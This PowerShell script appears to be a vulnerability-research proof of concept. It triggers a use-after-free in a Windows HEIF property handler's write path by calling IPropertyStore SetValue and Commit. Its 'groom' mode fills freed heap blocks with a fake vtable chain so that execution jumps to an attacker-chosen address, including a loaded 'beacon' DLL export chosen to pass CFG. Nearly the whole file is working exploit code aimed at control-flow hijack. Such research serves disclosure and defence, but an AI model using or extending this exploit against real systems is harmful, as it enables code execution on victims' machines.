# PowerShell trigger for the msheif_store write-path UAF + heap-spray
# content-control experiment.
#
# trigger mode: same COM sequence as the proven C independent caller
# (read pass -> copy -> Initialize(RW) -> SetValue(CameraModel, garbage
# LPWSTR) -> Commit) with ZERO harness code. Process death inside Commit
# = the bug, from pure PowerShell.
#
# spray mode: before Commit, allocate a message-only window-free heap
# pressure pattern (many allocations of the freed-object size class filled
# with a marker). If the wild pointer/vtable bytes at fault change from
# NT free-fill (feeefeee) to the marker, contents are attacker-controlled.
# Marker mode is only meaningful when the process survives to be
# inspected OR when the faulting instruction operand changes - both are
# visible in a WER dump, and LocalDumps is already configured for
# powershell.exe.

param(
    [Parameter(Mandatory=$true)][string]$InputFile,
    [string]$Mode = 'trigger',          # trigger | spray | groom
    [int]$SprayCount = 3000,
    [int]$SpraySize = 0x400
)

$ErrorActionPreference = 'Stop'

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public struct PROPERTYKEY { public Guid fmtid; public uint pid; }

[StructLayout(LayoutKind.Sequential)]
public struct PROPVARIANT {
    public ushort vt;
    public ushort r1;
    public ushort r2;
    public ushort r3;
    public IntPtr pwszVal;
    public IntPtr spare;
}

public delegate int DInit(IntPtr self, [MarshalAs(UnmanagedType.LPWStr)] string path, uint mode);
public delegate int DQueryInterface(IntPtr self, ref Guid riid, out IntPtr ppv);
public delegate int DSetValue(IntPtr self, ref PROPERTYKEY key, ref PROPVARIANT pv);
public delegate int DCommit(IntPtr self);

public static class PM {
    [DllImport("ole32.dll")] public static extern int CoInitializeEx(IntPtr r, uint coinit);
    [DllImport("ole32.dll")] public static extern int CoCreateInstance(ref Guid clsid, IntPtr unk, uint clsctx, ref Guid riid, out IntPtr ppv);
    [DllImport("ole32.dll")] public static extern int CoTaskMemFree(IntPtr p);
    [DllImport("propsys.dll", CharSet=CharSet.Unicode)] public static extern int PSGetPropertyKeyFromName(string name, out PROPERTYKEY pk);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
    public static extern IntPtr GlobalAlloc(uint flags, UIntPtr bytes);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GlobalFree(IntPtr h);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern IntPtr LoadLibrary(string name);

    public static IntPtr Vtbl(IntPtr obj, int slot) {
        IntPtr v = Marshal.ReadIntPtr(obj);
        return Marshal.ReadIntPtr(v, slot * IntPtr.Size);
    }
    public static DInit GetInit(IntPtr obj) {
        return (DInit)Marshal.GetDelegateForFunctionPointer(Vtbl(obj, 3), typeof(DInit));
    }
    public static DQueryInterface GetQI(IntPtr obj) {
        return (DQueryInterface)Marshal.GetDelegateForFunctionPointer(Vtbl(obj, 0), typeof(DQueryInterface));
    }
    public static DSetValue GetSetValue(IntPtr obj) {
        return (DSetValue)Marshal.GetDelegateForFunctionPointer(Vtbl(obj, 6), typeof(DSetValue));
    }
    public static DCommit GetCommit(IntPtr obj) {
        return (DCommit)Marshal.GetDelegateForFunctionPointer(Vtbl(obj, 7), typeof(DCommit));
    }
}
"@

$CLSID_PMH = [Guid]'a38b883c-1682-497e-97b0-0a3a9e801682'
$IID_INIT  = [Guid]'b7d14566-0509-4cce-a71f-0a554233bd9b'   # IInitializeWithFile (SDK-verified)
$IID_PS    = [Guid]'886d8eeb-8cf2-4446-8d02-cdba1dbdcf99'   # IPropertyStore
$STGM_READWRITE = 2

Write-Output ("mode: " + $Mode + "  target: " + $InputFile)
if (-not (Test-Path $InputFile)) { Write-Output "input missing"; exit 1 }

[PM]::CoInitializeEx([IntPtr]::Zero, 0) | Out-Null   # COINIT_MULTITHREADED

# Optional: load the CFG-instrumented beacon DLL (fixed base 0x180000000) so
# its export at VA 0x180001000 is mapped and a valid CFG target in this
# process. Enabled via PMH_BEACON env var (path to beacon.dll).
$beaconPath = $env:PMH_BEACON
if ($beaconPath -and (Test-Path $beaconPath)) {
    $hBeacon = [PM]::LoadLibrary($beaconPath)
    Write-Output ("beacon LoadLibrary -> 0x{0:X12} (expect 0x180000000)" -f $hBeacon.ToInt64())
}

# --- read pass on the ORIGINAL file (harness-equivalent) ---
$initR = [IntPtr]::Zero
$hr = [PM]::CoCreateInstance([ref]$CLSID_PMH, [IntPtr]::Zero, 1, [ref]$IID_INIT, [ref]$initR)
if ($hr -ne 0) { Write-Output ("CoCreateInstance(read) hr=0x{0:X8}" -f $hr); exit 2 }
$initFnR = [PM]::GetInit($initR)
$hr = $initFnR.Invoke($initR, $InputFile, 1)   # STGM_READ
Write-Output ("read-pass Initialize hr=0x{0:X8}" -f ($hr -band 0xFFFFFFFF))
# NOTE: we deliberately keep $initR open while the write pass runs,
# matching the harness lifetime.

# --- copy to .wr (the file the write pass modifies) ---
$workFile = $InputFile + '.wr'
Copy-Item $InputFile $workFile -Force

# --- write pass ---
$initW = [IntPtr]::Zero
$hr = [PM]::CoCreateInstance([ref]$CLSID_PMH, [IntPtr]::Zero, 1, [ref]$IID_INIT, [ref]$initW)
if ($hr -ne 0) { Write-Output ("CoCreateInstance(write) hr=0x{0:X8}" -f $hr); exit 2 }
$initFnW = [PM]::GetInit($initW)
$hr = $initFnW.Invoke($initW, $workFile, $STGM_READWRITE)
Write-Output ("write-pass Initialize hr=0x{0:X8}" -f ($hr -band 0xFFFFFFFF))
if ($hr -ne 0) { Write-Output "handler refused write"; exit 2 }

# QI IPropertyStore: slot 0 of the same object
$qiFn = [PM]::GetQI($initW)
$ps = [IntPtr]::Zero
$hr = $qiFn.Invoke($initW, [ref]$IID_PS, [ref]$ps)
Write-Output ("QI(IPropertyStore) hr=0x{0:X8} store=0x{1:X12}" -f ($hr -band 0xFFFFFFFF), $ps.ToInt64())
if ($hr -ne 0 -or $ps -eq [IntPtr]::Zero) { exit 2 }

# --- optional heap groom (content-control experiment v2) ---
# v1 'spray' HELD the blocks alive, which prevents reclaim of the freed node
# (no free blocks of that size exist -> NT heap returns feeefeee fill).
# v2 'groom': alloc -> stamp -> FREE. Freed blocks keep stale bytes and sit on
# the NT free list, so the node allocated+freed inside Commit can land on one.
# Payload plants a fake vtable chain so a successful reclaim means the
# node+0x18 -> obj -> vtbl -> call [vtbl+0x10] sequence executes OUR pointers:
#   [G+0x18] = G                 (obj pointer read from stale node)
#   [G+0x00] = G+0x40            (vtable pointer read from fake obj)
#   [G+0x50] = 0xDEADBEEFDEADBEEF  (call target -> RIP)
# Reclaim success = RIP 0xDEADBEEFDEADBEEF in the WER dump = PC control.
if ($Mode -eq 'groom') {
    # Groom v3: each block carries the FULL self-contained fake chain, with the
    # call target = BeaconProc (0x180001000, CFG-valid when PMH_BEACON is set):
    #   [G+0x18] = G+0x40          (obj pointer read by the walk)
    #   [G+0x40] = G+0x48          (fake vtable pointer)
    #   [G+0x58] = 0x180001000     (call target at [vtbl+0x10])
    # If a groom block is reused as the freed walk node, the destructor calls
    # the beacon BEFORE the unlink writes can trip heap validation.
    $target = $env:PMH_BEACON_TARGET
    if (-not $target) { $target = '0x180001000' }
    Write-Output ("grooming {0} x {1:#x}-byte blocks, call target {2}..." -f $SprayCount, $SpraySize, $target)
    if ($SpraySize -lt 0x60) { Write-Output "size too small for chain (need >= 0x60)"; exit 1 }
    $tgt = [UInt64]$target
    $groomed = 0
    for ($n = 0; $n -lt $SprayCount; $n++) {
        $h = [PM]::GlobalAlloc(0x40, [UIntPtr][UInt32]$SpraySize)
        if ($h -eq [IntPtr]::Zero) { break }
        $payload = New-Object byte[] $SpraySize
        for ($off = 0; $off -lt $SpraySize; $off += 4) { $payload[$off] = 0xDD }
        $base = $h.ToInt64()
        $chain = @{
            0x18 = ($base + 0x40)   # obj ptr
            0x40 = ($base + 0x48)   # fake vtable ptr
        }
        foreach ($k in $chain.Keys) {
            $v = $chain[$k]
            for ($b = 0; $b -lt 8; $b++) { $payload[$k + $b] = [byte](($v -shr (8 * $b)) -band 0xFF) }
        }
        for ($b = 0; $b -lt 8; $b++) { $payload[0x58 + $b] = [byte](($tgt -shr (8 * $b)) -band 0xFF) }
        [Runtime.InteropServices.Marshal]::Copy($payload, 0, $h, $SpraySize)
        [PM]::GlobalFree($h) | Out-Null
        $groomed++
    }
    Write-Output ("groomed+freed " + $groomed + " beacon-pattern blocks")
}

# --- SetValue: garbage VT_LPWSTR -> System.Photo.CameraModel ---
$pk = New-Object PROPERTYKEY
[PM]::PSGetPropertyKeyFromName('System.Photo.CameraModel', [ref]$pk) | Out-Null

$pv = New-Object PROPVARIANT
$pv.vt = 31   # VT_LPWSTR
$s = ''
for ($i = 0; $i -lt 62; $i++) { $s += [char](0x4e00 + ($i * 37) % 3000) }
$pv.pwszVal = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($s)

$setFn = [PM]::GetSetValue($ps)
$hr = $setFn.Invoke($ps, [ref]$pk, [ref]$pv)
Write-Output ("SetValue(CameraModel, 62-char LPWSTR) hr=0x{0:X8}" -f ($hr -band 0xFFFFFFFF))

# --- Commit = the dangerous call ---
Write-Output "Committing (dies here if the bug fires; WER dump follows)..."
$commitFn = [PM]::GetCommit($ps)
$hr = $commitFn.Invoke($ps)
Write-Output ("Commit hr=0x{0:X8}" -f ($hr -band 0xFFFFFFFF))
Write-Output "SURVIVED"
exit 0
